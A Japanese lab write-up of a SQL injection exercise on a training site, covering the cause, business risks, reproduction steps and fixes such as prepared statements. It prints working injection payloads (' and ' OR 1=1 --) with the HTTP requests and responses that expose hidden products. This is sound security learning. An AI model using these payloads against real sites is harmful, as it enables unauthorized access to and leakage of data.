# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## 概要
このラボでは、SQL文のwhere句にユーザ入力が連結しており、サニタイズされていないためSQLインジェクションが起きた。
意図しない動き（商品の全表示）を実現した。

## 対象エンドポイント


## 脆弱性の原因
GET /filter?category= の category パラメータが SQL の WHERE 句に
直接使用（文字連結）されているため、攻撃ポイントとなる。


## ビジネスリスク
機密性への影響：顧客情報や取引先の情報などの情報を閲覧・漏れてしまうリスクがある  
完全性への影響：データ改ざんされればサービス運営に致命的な損害が出るリスクがある  
可用性への影響：大量のデータを抽出しようとした場合、過負荷によりサーバがダウンし、webサイトが停止してしまうリスクがある  


## 再現手順
1.対象URL
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/
2.ユーザ入力箇所を特定する
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category=
3.SELECT * FROM PRODUCTS WHERE category=''
 という状態で待機していると推測。
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category='
 レスポンスが500．web上でinternal server errorとなったことを確認。
4.OR 1=2 --を実行して、SQL文が
<details>
<summary>HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=' HTTP/2
  
レスポンス
HTTP/2 500 Internal Server Error
<h4>Internal Server Error</h4>

</details>
  
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category=' OR 1=1 --
 すべて表示されたこと確認。
 
<details>
<summary>HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=' OR 1=1 -- HTTP/2
  
レスポンス
HTTP/2 200 OK
<h1>&apos; OR 1=1 --</h1>
</section> <section class="search-filters">

<div>
<h3>Babbage Web Spray</h3>
$67.06
</div>

<div>
<h3>Safety First</h3>
$36.12
</div>

などたくさんある

</details>
 
https://0af600ae03202ec281c1c0ad00c000f8.web-security-academy.net/filter?category=' OR 1=2 --
 SQL文は壊れず、すべて非表示になったことを確認。
<details>
<summary>HTTPリクエスト/レスポンス</summary>
  
リクエスト
GET /filter?category=' OR 1=2 -- HTTP/2
  
レスポンス
<h1>&apos; OR 1=2 --</h1>
<section class="container-list-tiles">
</section>
   
</details>


## 対策
プリペアドステートメントを使用し、ユーザ入力が文字連結しないようにする。
パラメータバインドを使用し、入力値をSQL文にを安全に渡す。
入力値のバリデーションを実施し、想定外の文字列（例：記号、制御文字、過度に長い文字列）を受け付けないようにする。


